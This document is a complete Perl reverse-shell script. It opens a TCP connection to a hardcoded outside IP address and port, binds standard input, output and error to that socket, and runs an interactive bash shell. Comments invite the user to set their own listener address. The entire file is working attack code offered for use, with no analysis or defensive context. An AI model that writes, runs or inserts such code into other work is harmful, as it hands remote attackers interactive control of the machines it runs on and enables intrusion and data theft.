#!/usr/bin/perl

use strict;
use warnings;
use Socket;

# Set your LHOST and LPORT here
my $i = '107.175.243.19';  # Replace with your IP address
my $p = 51000;   		   # Replace with your port number

# Create a socket and connect
socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp")) or die "Socket error: $!";
if (connect(S, sockaddr_in($p, inet_aton($i)))) {
    open(STDIN, '>&S') or die "Can't open STDIN: $!";
    open(STDOUT, '>&S') or die "Can't open STDOUT: $!";
    open(STDERR, '>&S') or die "Can't open STDERR: $!";
    exec("/bin/bash -i") or die "Exec error: $!";
}
